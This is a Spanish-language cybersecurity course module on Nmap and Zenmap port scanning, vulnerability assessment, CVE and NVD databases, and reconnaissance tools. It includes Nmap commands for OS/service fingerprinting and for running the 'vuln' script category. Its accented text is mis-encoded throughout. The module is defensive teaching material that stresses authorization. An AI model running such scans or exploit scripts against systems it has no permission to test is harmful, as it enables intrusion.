Disponemos de una grand√≠sima cantidad de scripts dentro de Nmap NSE con el objetivo de comprobar la seguridad de decenas de servicios, porque no solamente tendremos los t√≠picos de servidores Samba, FTP, SSH y m√°s, sino que tambi√©n podremos atacar de forma muy concreta un servidor web con cabeceras HTTP especiales para ver si hay vulnerabilidades, por supuesto, tendremos scripts espec√≠ficos que nos permitir√° explotar vulnerabilidades al PHP de los servidores web, por supuesto, tambi√©n podremos explotar vulnerabilidades a los diferentes servidores Samba, FTP y SSH, es decir, vulnerabilidades conocidas que ya han sido solucionadas, pero que es posible que todav√≠a el objetivo las tenga operativas. Por este motivo es tan importante actualizar cuanto antes todos los servicios que tengamos expuestos a Internet, y tambi√©n servicios que tengamos expuestos a la red local, porque con un malware podr√≠a explotar una vulnerabilidad y convertirse el ataque de penetraci√≥n en un ataque de ransomware para cifrar todos los archivos y carpetas.

Recomiendo visitar la **[web oficial de uso de NSE](https://nmap.org/book/nse-usage.html)** donde encontr√°s todos los scripts que hay actualmente en esta gran base de datos, adem√°s, tendr√°s ejemplos de c√≥mo utilizarlos.

# **Zenmap, la interfaz gr√°fica de Nmap**

Zenmap es una herramienta gratuita que podemos utilizar para **escanear los puertos**. Podemos saber cu√°les tenemos abiertos, para evitar problemas a la hora de usar algunos programas o acceder a un servidor. Se trata de la interfaz gr√°fica del popular programa de c√≥digo abierto Nmap, que permite hacer un escaneo de puertos completo de cualquier equipo conectado. Hay que indicar que esta herramienta, que es totalmente gratuita, est√° disponible para **diferentes sistemas operativos** como Microsoft Windows, Linux o macOS. Permite a los usuarios ejecutar diferentes tipos de an√°lisis de puertos. Es ideal tanto para usuarios menos experimentados como tambi√©n para los m√°s avanzados.

Para comenzar a utilizar Zenmap lo primero que tenemos que hacer es **descargarlo**. Podemos hacerlo desde la [p√°gina oficial](https://nmap.org/download.html) de Nmap. All√≠ encontraremos las diferentes versiones, seg√∫n el sistema operativo que estemos utilizando. El proceso de instalaci√≥n es sencillo, r√°pido e intuitivo. En unos segundos lo tendremos listo para utilizar.

![zenmap](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/zenmap.png?raw=true)

Cuando lo hayamos instalado simplemente tendremos que ejecutarlo. Nos encontraremos con una imagen como la de arriba. Podemos elegir un escaneo de puertos a fondo, escaneo r√°pido, puertos TCP, UDP, etc. Con Zenmap podemos ver **qu√© puertos hay abiertos** en cualquier dispositivo. En el apartado de Objetivo tenemos que poner la direcci√≥n IP que corresponde a ese equipo para, posteriormente, realizar el escaneo para que muestre cu√°les est√°n abiertos. Por tanto lo primero que tenemos que hacer es saber **cu√°l es la direcci√≥n IP** de nuestro equipo.

En Windows este proceso es muy sencillo. Simplemente tenemos que ir a Inicio, ejecutamos el S√≠mbolo del sistema y posteriormente ipconfig. Nos mostrar√° una serie de informaci√≥n entre las que podemos ver la puerta de enlace predeterminada (generalmente 192.168.1.1) as√≠ como la direcci√≥n IP de ese equipo. Cuando sepamos cu√°l es la direcci√≥n tendremos que ponerla en el apartado de Objetivo, en Zenmap. Posteriormente tendremos que elegir el tipo de escaneo que queremos realizar, como podr√≠a ser por ejemplo un escaneo completo de todos los puertos TCP.

![Puertos TCP](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/puertos-tcp.png?raw=true)

En Zenmap, en la parte de arriba, encontraremos **diferentes pesta√±as**. Veremos Salida Nmap, Puertos/Servidores, Topolog√≠a, Detalles del servidor y Escaneos. Todos ellos nos aporta informaci√≥n, as√≠ como poder elegir el tipo de servicio en la parte de la izquierda. Cuando le damos a Puertos/Servidores nos aparecer√° una recopilaci√≥n de todos los puertos abiertos y filtrados que hay en ese host. Hay que tener en cuenta que nos aparecer√°n m√°s o menos puertos en funci√≥n del tipo de escaneo que hayamos realizado.

![Salida Nmap](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/salida-nmap.png?raw=true)

Si pinchamos en **Escaneos** nos aparecer√°n todos los escaneos que hemos realizado. Los podemos guardar para poder analizar los datos en otra ocasi√≥n, as√≠ como tambi√©n eliminarlos y que no aparezcan ah√≠.

Esto lo podemos hacer con cualquier otro equipo que tengamos conectado a la red. Por ejemplo, podemos comprobar tambi√©n los **puertos abiertos** y hacer un escaneo a nuestro tel√©fono m√≥vil. √önicamente vamos a necesitar conocer cu√°l es la direcci√≥n IP. Eso s√≠, hay que tener en cuenta que este proceso puede tardar m√°s o menos seg√∫n el tipo de dispositivo.

En definitiva, Zenmap es un programa interesante con el que podemos hacer escaneos de puertos. Lo podemos usar en Windows, que es el sistema operativo m√°s utilizado en equipos de escritorio, as√≠ como en Linux y macOS. Su uso es sencillo e intuitivo y podremos tener un mayor control sobre qu√© puertos tenemos abiertos, especialmente cuando necesitamos conocer si un equipo va a funcionar correctamente al hacer uso de alguna aplicaci√≥n que requiera de ciertos puertos abiertos.

## **Implementaci√≥n en empresas**

Muchas empresas deciden implementar estos sistemas para tener un poco m√°s de control sobre sus redes. Pero esto es algo que se debe estudiar de forma detenida, y siguiendo unos pasos para que todo el proceso sea totalmente eficiente. Estos pasos son:

- **Evaluaci√≥n de necesidades:** Siempre y cuando se implemente un nuevo sistema en una empresa, es necesario realizar una evaluaci√≥n de las necesidades que vamos a tener dentro de la organizaci√≥n. Tendremos que identificar los objetivos, los activos cr√≠ticos de la red, y todos y cada uno de los requisitos de seguridad que vamos a necesitar solucionar con NMAP.
- **Instalaci√≥n y configuraci√≥n:** En cualquier entorno, lo m√°s recomendable es acudir siempre a los sitios oficiales para obtener la herramienta. Esto har√° que el proceso sea totalmente seguro. Una vez disponemos de ella, tendremos que configurar correctamente los ajustes y opciones en NMAP para que esta cumpla con los requisitos espec√≠ficos.
- **Pol√≠ticas y procedimientos:** Las pol√≠ticas que se establezcan en NMAP, deben ser claras y concisas. Aqu√≠ podremos configurar los escaneos y los tipos, as√≠ como los protocolos de notificaci√≥n y reporte de hallazgos.
- **Capacitaci√≥n:** Todo el personal que utilice NMAP, debe estar correctamente formado y capacitado para utilizarlo. Ser√° necesario comprender c√≥mo se utiliza la herramienta de forma segura y efectiva, y que siempre deben estar al tanto de todas las pol√≠ticas y procedimientos.
- **An√°lisis:** Como es normal, NMAP nos va a dar unos resultados. Estos deben ser analizados, y como tal ser√° necesario tener un procedimiento para ello. Esto har√° que el an√°lisis sea mucho m√°s efectivo, y tengamos la informaci√≥n adecuada en todo momento.
- **Actualizaciones:** Una vez disponemos de la herramienta instalada y configurada, tendremos que establecer la forma en la cual vamos a mantenerla actualizada. Esto es algo cr√≠tico, ya que ser√° necesario para que todo se mantenga lo m√°s segura posible y con el funcionamiento m√°s √≥ptimo.

<aside>
üëâ Como podemos ver, Nmap es una herramienta tremendamente √∫til, que nos puede dar muchas facilidades a la hora de gestionar redes.

</aside>

# **Identificaci√≥n de sistemas y servicios vulnerables.**

La identificaci√≥n de sistemas y servicios vulnerables es un paso cr√≠tico en las pruebas de penetraci√≥n y la evaluaci√≥n de seguridad. Aqu√≠ se describen los pasos generales y algunas herramientas comunes utilizadas para llevar a cabo esta tarea:

- **Escaneo de Puertos:** Utiliza herramientas como Nmap, Masscan o Unicornscan para identificar puertos abiertos en el sistema objetivo.
- **Identificaci√≥n de Servicios:** Examina los servicios en los puertos abiertos utilizando t√©cnicas como el fingerprinting para determinar la versi√≥n y el tipo de servicio.
- **B√∫squeda de Vulnerabilidades Conocidas:** Utiliza bases de datos de vulnerabilidades, como el NIST National Vulnerability Database (NVD) o el Common Vulnerabilities and Exposures (CVE), para buscar vulnerabilidades conocidas asociadas a las versiones de servicios identificadas.
- **Escaneo Activo y An√°lisis de Configuraci√≥n:** Utiliza herramientas como Nessus o OpenVAS para realizar escaneos de vulnerabilidades y analizar configuraciones en busca de debilidades conocidas.
- **Explotaci√≥n Selectiva:** Si se cuenta con autorizaci√≥n expl√≠cita, se puede intentar la explotaci√≥n controlada de vulnerabilidades para confirmar su existencia y evaluar el impacto potencial.
- **An√°lisis de Logs y Documentaci√≥n:** Examina registros de sistemas y servicios para identificar actividades an√≥malas, y documenta todas las vulnerabilidades identificadas.

</aside>
üí° Es fundamental que todas las actividades se realicen con el consentimiento del propietario del sistema y en conformidad con las leyes y regulaciones aplicables. Adem√°s, los resultados deben ser documentados de manera clara y comunicados al cliente de manera √©tica y profesional.
</aside>

## **Evaluaci√≥n de vulnerabilidad: qu√© es y c√≥mo realizarla**

Una evaluaci√≥n de vulnerabilidad analiza y estima los riesgos de las debilidades en seguridad de los sistemas de una organizaci√≥n. Se conocen m√°s de 180.000 vulnerabilidades de seguridad y cada a√±o se descubren nuevas. Con tantas brechas potenciales en la infraestructura y tantas posibilidades de ataque en los sistemas, no es sorprendente que la ciberdelincuencia haya aumentado considerablemente en los √∫ltimos a√±os. Sin embargo, cuando se realizan de forma regular y correcta, las evaluaciones de vulnerabilidad pueden actuar como medida preventiva contra estas crecientes amenazas a la seguridad. Hay que considerar que, incluso con defensas de seguridad de primera calidad, los sistemas de informaci√≥n y seguridad de una organizaci√≥n pueden ser atacados, pirateados o secuestrados por los ciberdelincuentes.

## **Qu√© es una evaluaci√≥n de vulnerabilidad**

Una evaluaci√≥n de la vulnerabilidad es el proceso de revisi√≥n y estimaci√≥n de todas las posibles debilidades de seguridad en la infraestructura de un sistema de informaci√≥n. Este tipo de evaluaci√≥n se utiliza para identificar, priorizar y mitigar vulnerabilidades y para minimizar potenciales amenazas a la seguridad. Estas evaluaciones tambi√©n descubren y analizan las vulnerabilidades dentro del entorno f√≠sico de la organizaci√≥n. Los objetivos de una evaluaci√≥n de la vulnerabilidad pueden desglosarse en tres ideas principales:

- Identificar todas las vulnerabilidades
- Documentar las vulnerabilidades para su futura identificaci√≥n y soluci√≥n
- Orientar a los desarrolladores que crean soluciones para esas amenazas

Las evaluaciones de vulnerabilidad deben realizarse regularmente, especialmente cuando se instalan nuevos equipos, se a√±aden puertos o se introducen servicios. Adem√°s, las evaluaciones de vulnerabilidad pueden prevenir ataques al sistema en dispositivos -nuevos y antiguos- debido a amenazas como:

- Ataques de inyecci√≥n, incluyendo ataques XSS y ataques SQL
- Configuraciones d√©biles por defecto, como contrase√±as de administraci√≥n y nombres de usuario f√°ciles de adivinar
- Ataques de malware y programas maliciosos
- Herramientas y dispositivos de autenticaci√≥n defectuosos
- Datos sin cifrar

<aside>
üí° En el caso de las organizaciones de riesgo -como los bancos, los sistemas gubernamentales y aquellos que tienen acceso a informaci√≥n personal, como centros sanitarios-, las evaluaciones de vulnerabilidad pueden ayudar a identificar y reducir los puntos d√©biles antes de que sean explotados por los hackers.

</aside>

## **Tipos de evaluaciones de vulnerabilidades**

Los diferentes tipos de evaluaciones de vulnerabilidad utilizan herramientas individuales para identificar los puntos d√©biles del sistema y de la red. Los sistemas independientes pueden necesitar varios tipos de evaluaciones para identificar todas sus posibles vulnerabilidades.

- **Evaluaci√≥n del host:** Una evaluaci√≥n del host se centra en los servidores, estaciones de trabajo y otros elementos de la red cr√≠ticos. Aunque los puertos y servicios pueden ser escaneados con evaluaciones de red, una evaluaci√≥n de host es capaz de repasar el historial de parches y la configuraci√≥n.
- **Evaluaci√≥n de la red:** Una evaluaci√≥n de la red se utiliza para identificar posibles vulnerabilidades de conjunto. Puede realizarse tanto para redes conectadas por cable como inal√°mbricas; estas evaluaciones ayudan a prevenir los ataques de seguridad dirigidos a esas redes privadas y p√∫blicas, as√≠ como a la informaci√≥n accesible de los equipos conectados.
- **Evaluaci√≥n inal√°mbrica:** El objetivo de una evaluaci√≥n inal√°mbrica es analizar la red Wi-Fi de una organizaci√≥n. Las redes inal√°mbricas inseguras, incluidas las que tienen puntos de acceso no aprobados, pueden provocar ataques a toda la infraestructura de una organizaci√≥n. Estas evaluaciones tambi√©n verifican que la red de una organizaci√≥n est√° configurada de forma segura con HTTPS.
- **Evaluaciones de bases de datos:** Las evaluaciones de bases de datos analizan el conjunto de datos almacenados de una organizaci√≥n en busca de vulnerabilidades. Los ataques maliciosos, como las inyecciones SQL, suelen tener como objetivo bases de datos con configuraciones err√≥neas, bases de datos no registradas y aquellas que tienen test de desarrollo d√©biles (DevTest). Estas evaluaciones tambi√©n ayudan a las organizaciones a identificar d√≥nde hay que clasificar la informaci√≥n personal en una infraestructura.
- **Evaluaci√≥n de aplicaciones:** Una evaluaci√≥n de aplicaciones analiza las apps web, los sitios y el c√≥digo fuente en busca de descargas de software incorrectas, configuraciones rotas y otras vulnerabilidades de seguridad. Suelen ser escaneos automatizados del c√≥digo y la infraestructura del front-end.


![Evaluaciones Vulnerabilad](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/evaluaciones-vulnerabilad.png?raw=true)

## **Evaluaci√≥n de vulnerabilidades frente a test de penetraci√≥n**

Las evaluaciones de vulnerabilidades y las pruebas de penetraci√≥n no son lo mismo, pero como las evaluaciones de vulnerabilidad tambi√©n pueden incluir un test de penetraci√≥n, ambas pueden confundirse f√°cilmente. Estas evaluaciones duales se conocen a menudo como evaluaci√≥n de vulnerabilidades/test de penetraci√≥n o VAPT, pero no tienen por qu√© realizarse siempre juntas.

Las pruebas de penetraci√≥n se utilizan espec√≠ficamente para encontrar debilidades en el personal, en la organizaci√≥n y en sus procedimientos y es un proceso adicional que puede a√±adirse a toda la evaluaci√≥n de la vulnerabilidad. Las pruebas de penetraci√≥n tambi√©n intentan crear un da√±o en una aplicaci√≥n o red explotando posibles debilidades en un entorno controlado, a fin de demostrar que las vulnerabilidades existen realmente.

Las pruebas de penetraci√≥n utilizan maniobras tanto autom√°ticas como manuales para comprobar las vulnerabilidades. Esas debilidades luego son analizadas por los investigadores para poder crear protecciones y defensas espec√≠ficas. Sin embargo, no son suficientes por s√≠ solas y deben ir seguidas de una evaluaci√≥n completa de la vulnerabilidad.

## **Realizaci√≥n de una evaluaci√≥n de la vulnerabilidad: etapas para identificar las vulnerabilidades**

Si se realiza una evaluaci√≥n de la vulnerabilidad sin una prueba de penetraci√≥n, hay cuatro etapas principales.

![Etapas Evaluacion](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/etapas-evaluacion.png?raw=true)

## **Identificaci√≥n de activos y vulnerabilidades**

La identificaci√≥n es la primera etapa cuando se realiza una evaluaci√≥n de vulnerabilidades: antes de comenzar un esc√°ner, debes identificar los activos escaneables, incluyendo herramientas populares, como dispositivos m√≥viles, dispositivos del Internet de las Cosas y programas basados en la nube. A continuaci√≥n, la infraestructura es escaneada por herramientas automatizadas o manualmente por analistas de seguridad. Se elabora un informe de evaluaci√≥n de vulnerabilidad que describe los puntos d√©biles identificados.

## **An√°lisis**

En la etapa de an√°lisis de una evaluaci√≥n de vulnerabilidad, el objetivo es encontrar el origen y la causa de cada debilidad. Para identificar la causa ra√≠z, los componentes de la infraestructura que son responsables de cada vulnerabilidad deben ser verificados y analizados m√°s a fondo. En la etapa de an√°lisis tambi√©n se comprueba si hay sistemas mal instalados o actualizados.

Los esc√°neres de vulnerabilidad -y sus bases de datos integradas de vulnerabilidades conocidas- pueden se√±alar posibles puntos d√©biles del sistema, dispositivos vulnerables y software de riesgo para ayudar a completar esta etapa. Dado que muchas vulnerabilidades se comunican p√∫blicamente, se pueden identificar r√°pidamente y analizar su causa original.

## **Evaluaci√≥n de riesgo y priorizaci√≥n**

Despu√©s de haber identificado y analizado las vulnerabilidades de tu organizaci√≥n, es el momento de llevar a cabo una evaluaci√≥n de riesgos y determinar la priorizaci√≥n. La primera etapa deber√≠a haber proporcionado informes de evaluaci√≥n, que pueden utilizarse para determinar qu√© vulnerabilidades son m√°s peligrosas para una organizaci√≥n. Durante una evaluaci√≥n de riesgos, los analistas de seguridad asignan a cada vulnerabilidad una puntuaci√≥n de gravedad; los n√∫meros m√°s altos indican puntos d√©biles que deben abordarse lo antes posible. Las vulnerabilidades se clasifican en funci√≥n de una serie de factores, entre ellos:

- Los sistemas afectados
- La informaci√≥n puesta en riesgo
- Facilidad de ataque o compromiso
- Da√±o potencial a la infraestructura y a la organizaci√≥n

## **Reparaci√≥n y mitigaci√≥n**

La etapa final al realizar una evaluaci√≥n de vulnerabilidad es la de remediaci√≥n y mitigaci√≥n. Esta etapa suele estar a cargo de los profesionales de la seguridad y los equipos de operaciones, y se centra en encontrar formas de aliviar las debilidades mientras se desarrollan planes para disminuir la posibilidad de que vuelvan a aparecer las vulnerabilidades. Al crear planes de remediaci√≥n y mitigaci√≥n, los profesionales deben centrarse en dos factores:

- **Gravedad:** tras la priorizaci√≥n, los equipos deben abordar primero las vulnerabilidades m√°s graves. Con el tiempo, deber√≠an ser capaces de crear y publicar correcciones para cada vulnerabilidad detectada pero la correcci√≥n temprana se centra en las m√°s peligrosas.
- **Exposici√≥n a la vulnerabilidad:** determinar si una vulnerabilidad est√° orientada al p√∫blico o a la Red tambi√©n deber√≠a ser una de las principales preocupaciones de los profesionales de la reparaci√≥n. Las vulnerabilidades orientadas a Internet son m√°s f√°ciles de explotar por los ciberdelincuentes, por lo que estas debilidades deben mitigarse en primer lugar, seguidas de los dispositivos propiedad de los empleados y los que almacenan informaci√≥n sensible.

Si se publican parches del sistema o correcciones de la vulnerabilidad, el proceso de evaluaci√≥n de la vulnerabilidad debe comenzar de nuevo. Es importante ejecutar una evaluaci√≥n cuando se instala cualquier tipo de sistema o parche nuevo para as√≠ identificar, analizar, priorizar y remediar r√°pidamente cualquier nueva vulnerabilidad que pueda surgir.

## **Herramientas de evaluaci√≥n de la vulnerabilidad**

Con frecuencia las herramientas de evaluaci√≥n de la vulnerabilidad son procesos automatizados que pueden ser utilizados por cualquiera, desde los expertos en ciberseguridad y los cazadores de amenazas hasta el trabajador que se conecta en su casa. Estas herramientas escanean los sistemas en busca de vulnerabilidades existentes y de nuevos puntos d√©biles no comunicados. Adem√°s, cada herramienta de evaluaci√≥n tiene un prop√≥sito espec√≠fico basado en el tipo de evaluaci√≥n que debe realizar.

**Tipos de herramientas de evaluaci√≥n de la vulnerabilidad:**

- Esc√°neres de aplicaciones web
- Esc√°neres de protocolos
- Esc√°neres de red
- Esc√°neres de vulnerabilidad externa e interna
- Esc√°neres ambientales

Adem√°s del tipo de evaluaci√≥n que realiza cada herramienta, √©stas tienen caracter√≠sticas propias que el usuario debe tener en cuenta. A la hora de elegir una herramienta de evaluaci√≥n, ten en cuenta estas caracter√≠sticas:

- Frecuencia de las actualizaciones
- Capacidad para minimizar los falsos positivos y negativos
- Capacidad de integraci√≥n con otras herramientas de evaluaci√≥n y seguridad
- Resultados procesables

Si bien las evaluaciones de vulnerabilidad son una parte necesaria del proceso de ciberseguridad, hay precauciones adicionales que puedes tomar para mantener mejor protegida la infraestructura. Invertir en una VPN puede ayudar a proteger tu navegaci√≥n en redes p√∫blicas y privadas, mientras que un antivirus puede ayudar a mantener seguros tanto los dispositivos m√≥viles como de sobremesa.

## **Identificando sistemas operativos y servicios**

Como vemos, nmap nos permite detectar puertos que est√°n escuchando en una IP o un rango. Posteriormente veremos adem√°s c√≥mo se pueden definir otras t√©cnicas de sondeo. Adem√°s, nmap nos permite intentar identificar qu√© tecnolog√≠a (producto, versi√≥n, etc.) hay detr√°s de un puerto abierto, o incluso el sistema operativo instalado en un servidor, con los par√°metros -O y -sV. Esta detecci√≥n se basa en la ‚Äúfirma‚Äù (fingerprint) de las respuestas que da el servicio a determinadas llamadas.

> Sudo nmap -O -sV 192.168.1.1

![Etapas Evaluacion](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/etapas-evaluacion.png?raw=true)

En este caso, no solamente sabemos que esta m√°quina tiene determinados puertos abiertos. Tambi√©n nos dice que es un linux y las versiones de los distintos puertos que est√°n escuchando, de forma que esta informaci√≥n puede ser utilizada para explotar vulnerabilidades sobre versiones no parcheadas, etc.

![Sudo nmap](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/sudo-nmap.png?raw=true)

## **Utilizando m√°s t√©cnicas de sondeo**

Por defecto nmap utiliza SYN como t√©cnica de sondeo. Es una t√©cnica r√°pida y poco intrusiva / detectable, pero en ocasiones , pero soporta en total 12 t√©cnicas distintas que podemos definir como par√°metros, tal como podemos ver en el [manual de uso de la herramienta](https://nmap.org/man/es/man-port-scanning-techniques.html). Por ejemplo, si queremos hacer un escaneo basado en llamadas UDP, podemos hacer una llamada del tipo:

> Sudo nmap -sU 192.168.1.1

![Sudo nmap](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/sudo-nmap.png?raw=true)
**Usuario**

## **Buscando vulnerabilidades con nmap**

Si bien existen herramientas m√°s ‚Äúc√≥modas‚Äù y espec√≠ficas para la b√∫squeda de vulnerabilidades, como por ejemplo Nessus, o suites como Metasploit que consolida diversas herramientas, nmap tambi√©n nos permite realizar an√°lisis de vulnerabilidades.

Para ello, utiliza una serie de scripts Lua que est√°n ubicados en una ruta de nuestra m√°quina (en el caso de Kali, en /usr/share/nmap/scripts/ ) y que se pueden invocar con ‚Äìscript o su equivalente -sC.

Los scripts pueden pertenecer a una o varias categor√≠as, de forma que podemos pedir a nmap que eval√∫e, por ejemplo, todos los scripts de una categor√≠a contra un host. Hay algunas categor√≠as especialmente interesantes como ‚Äúvuln‚Äù (scripts dedicados a detectar vulnerabilidades en el destino), ‚Äúexploit‚Äù, etc.

Por ejemplo, si queremos escanear los scripts de categor√≠a vulnerabilidad contra un host:

> nmap --script vuln scanme.nmap.org

![Nmap Script](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/nmap-script.png?raw=true)

Como vemos, el script ha detectado muchas vulnerabilidades. Si analizamos los scripts veremos que muchos de ellos servir√°n para explotar estas vulnerabilidades. En definitiva, nmap incluye incluso opciones interesantes para evaluar vulnerabilidades e incluso lanzar exploits, si bien existen otras herramientas utilizadas com√∫nmente para este prop√≥sito.

## **Precauciones**

Siempre y cuando vamos a utilizar este tipo de programas o herramientas, debemos tener claro que esto puede ser peligroso para los usuarios. Al escanear los paquetes que se transportan por la red, podemos tener gran cantidad de informaci√≥n en nuestra mano. Esto hace que sea m√°s sencillo que se produzca alguna filtraci√≥n de datos. Por lo cual siempre se deben utilizar de forma adecuada, y con fines legales. Si bien el uso de este tipo de aplicaciones no es ilegal, todo lo contrario, debemos tener cuidado con su uso.

Tenemos una grand√≠sima cantidad de programas para realizar escaneos de vulnerabilidades a nuestras redes, equipos, servicios web y otros servicios que incorporan los servidores. Dependiendo de lo que estemos realizando, tendremos que utilizar un esc√°ner u otro.

## **Bases de datos de vulnerabilidades**

Un aspecto importante es que las distintas soluciones de gesti√≥n de seguridad inform√°tica se valen de estas bases de datos para apoyarnos en la mitigaci√≥n de los riesgos de potenciales ciberataques. Las bases de datos que encontrar√°s a continuaci√≥n, y otras m√°s, son los principales contribuyentes a las soluciones de gesti√≥n de seguridad. Antes de que existiesen est√°ndares como el **CVE y CVSS**, las distintas soluciones ten√≠an bases de datos propias de cada uno y con una gran disparidad de criterios a la hora de nombrarlos, clasificar su criticidad y otros aspectos m√°s.

## **CVE (Common Vulnerabilities and Exposures)**

Es una de las fuentes m√°s confiables a la hora de identificar, analizar y certificar una vulnerabilidad encontrada. Cada una de las vulnerabilidades presentes en esta base de datos, cuenta con n√∫mero **CVE**. Este √∫ltimo es proporcionado por un grupo de autoridades especializadas del grupo de trabajo CVE. Pero, ¬øpor qu√© una vulnerabilidad tendr√≠a un n√∫mero identificador? Esto permite que el manejo de la informaci√≥n respecto a la misma sea mucho m√°s confiable, evitando ambig√ºedades o datos err√≥neos que perjudiquen la informaci√≥n respecto a la vulnerabilidad en cuesti√≥n. Este mismo n√∫mero permite que sea f√°cilmente identificado y evaluado por las **distintas herramientas de seguridad** como los SIEM, que son los Sistemas de Gesti√≥n de Informaci√≥n y Eventos de Seguridad, para que puedan facilitar la puesta en marcha de acciones para mitigar los riesgos.

Desde su fundaci√≥n en el a√±o 1999, CVE se ha convertido en un est√°ndar a la hora de hacer p√∫blica cualquier vulnerabilidad. Como hemos comentado, las distintas herramientas de seguridad implementadas, sobre todo en redes empresariales, personas especializadas en seguridad inform√°tica, e incluso, el p√∫blico en general, logran comunicarse m√°s fluidamente. Esto √∫ltimo, respecto a lo que consiste cierta vulnerabilidad y sus impactos. Estamos seguros que en alg√∫n momento, habr√°s le√≠do alguna noticia, publicaci√≥n o tuit respecto a una o varias vulnerabilidades. En muchos casos, **hacen referencia al n√∫mero CVE** como una forma de respaldo seguro y confiable respecto a la informaci√≥n presentada.

## **CERT Base de Datos de Vulnerabilidades**

Otra base de datos que en esta ocasi√≥n corresponde a la prestigiosa [CERT](https://www.kb.cert.org/vuls/) (***Computer Emergency Response Team***). La misma provee informaci√≥n respecto a cualquier vulnerabilidad de software. Los datos que se incluyen son detalles t√©cnicos, posibles formas de remediaci√≥n y cu√°les son los fabricantes afectados. Varios de los registros encontrados son resultado del esfuerzo de individuos. As√≠ tambi√©n, personas que trabajan fuera de las instituciones de gobierno con el fin de poner a disposici√≥n de toda la informaci√≥n encontrada.

En consecuencia, varios de los registros podr√≠an dar la impresi√≥n de que falta profundidad respecto a uno o m√°s datos. Es por eso que la propia CERT recomienda referirse a bases de datos de instituciones de gobierno **como la NVD**, de la cual hablaremos a continuaci√≥n.

## **NVD (Base de Datos Nacional de Vulnerabilidades)**

Como comentamos recientemente, esta base de datos est√° ligada a una instituci√≥n gubernamental. La misma es la **[NIST](https://nvd.nist.gov/)**, que es el Instituto Nacional de Est√°ndares y Tecnolog√≠a. Es un extenso repositorio que aloja datos respecto a vulnerabilidades que se han gestionado mediante el protocolo SCAP. Sus siglas significan *Security Content Automation Protocol*.

La ventaja directa de estos datos es que se hace mucho m√°s f√°cil la automatizaci√≥n de tareas repetitivas de la gesti√≥n de vulnerabilidades, medici√≥n de indicadores de seguridad y cumplimiento. Adem√°s, podr√°s encontrar todo lo relacionado a fallos de seguridad encontrados en todo tipo de software. As√≠ tambi√©n, sabr√°s respecto a errores en la configuraci√≥n, el nombre del fabricante afectado y los potenciales impactos de la vulnerabilidad o fallo encontrado.

![received](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/received.png?raw=true)

Un detalle muy importante es que, al ingresar al panel de estad√≠sticas, nos encontraremos con las vulnerabilidades listadas con la clasificaci√≥n CVE, que corresponde a la primera base de datos que hemos citado. Esto significa que pr√°cticamente toda vulnerabilidad citada en CVE, tiene un respaldo extra de parte de la base de datos nacional. A pesar de que esta es una instituci√≥n que depende del gobierno de los Estados Unidos, es una de las fuentes m√°s consultadas para estar al tanto de las √∫ltimas vulnerabilidades.

Por otro lado, dicho panel muestra un par de gr√°ficos basados en **CVSS**. Estas siglas significan *Common Vulnerability Scoring System*. Este es un est√°ndar abierto que se utiliza para medir la gravedad de cada una de las vulnerabilidades encontradas. B√°sicamente, se cuenta con cuatro posibilidades o niveles: bajo, medio, alto y cr√≠tico. Se llega a concluir que una vulnerabilidad tiene determinado nivel en base a una serie de m√©tricas. El est√°ndar, as√≠ como todas las bases de datos que hemos citado, es de acceso libre y gratuito para cualquier persona interesada.

# **Recopilaci√≥n de informaci√≥n sobre el objetivo**

La recopilaci√≥n de informaci√≥n sobre el objetivo, tambi√©n conocida como fase de "reconocimiento" o "enumeraci√≥n", es una etapa crucial en pruebas de penetraci√≥n y evaluaciones de seguridad. Aqu√≠ se describen pasos generales y algunas t√©cnicas y herramientas comunes utilizadas en esta fase:

- **Definir el Alcance:** Establecer los l√≠mites y objetivos espec√≠ficos de la recopilaci√≥n de informaci√≥n, y obtener el consentimiento del propietario del sistema o red.
- **Identificar Objetivos:** Determinar los sistemas, redes, aplicaciones y servicios espec√≠ficos que se van a evaluar durante la prueba.
- **Recopilaci√≥n de Dominios:** Utilizar t√©cnicas como WHOIS, DNS enumeration, y b√∫squeda en motores de b√∫squeda para recopilar informaci√≥n sobre dominios asociados al objetivo.
- **Escaneo de Subdominios:** Utilizar herramientas como Sublist3r, Subfinder, o DNSDumpster para identificar subdominios asociados al objetivo.
- **Identificaci√≥n de Servidores de Correo:** Buscar servidores de correo asociados al objetivo utilizando t√©cnicas de resoluci√≥n DNS y herramientas especializadas.
- **Enumeraci√≥n de Redes:** Utilizar t√©cnicas como escaneo de red, ARP scanning, o SNMP enumeration para identificar dispositivos y hosts en la red del objetivo.
- **Identificaci√≥n de Tecnolog√≠as:** Utilizar herramientas como Wappalyzer, BuiltWith o WhatWeb para identificar tecnolog√≠as, plataformas y servicios utilizados en el objetivo.
- **Exploraci√≥n de Aplicaciones Web:** Identificar aplicaciones web en el objetivo y obtener informaci√≥n sobre sus tecnolog√≠as, versiones y configuraciones.

## **Herramientas Comunes para Recopilaci√≥n de Informaci√≥n:**

- **WHOIS Lookup:** Obtener informaci√≥n sobre propietarios de dominios y direcciones IP.
    - **Herramienta:** WHOIS (comando de l√≠nea), WHOIS websites.
- **DNS Enumeration**: Identificar registros DNS, incluyendo servidores de nombres y direcciones IP asociadas.
    - **Herramienta:** Dig, NSLookup, DNSRecon.
- **Subdomain Enumeration:** Identificar subdominios asociados al dominio principal.
    - **Herramienta:** Sublist3r, Subfinder, DNSDumpster.
- **Escaneo de Red:** Identificar hosts activos y dispositivos en la red.
    - **Herramienta:** Nmap, Masscan, ARP Scan.
- **Exploraci√≥n de Aplicaciones Web:** Identificar aplicaciones web y sus tecnolog√≠as asociadas.
    - **Herramienta:** Wappalyzer, BuiltWith, WhatWeb.
- **B√∫squeda de Tecnolog√≠as y Versiones:** Identificar tecnolog√≠as y versiones utilizadas en el objetivo.
    - **Herramienta:** Shodan, Censys, Nmap.

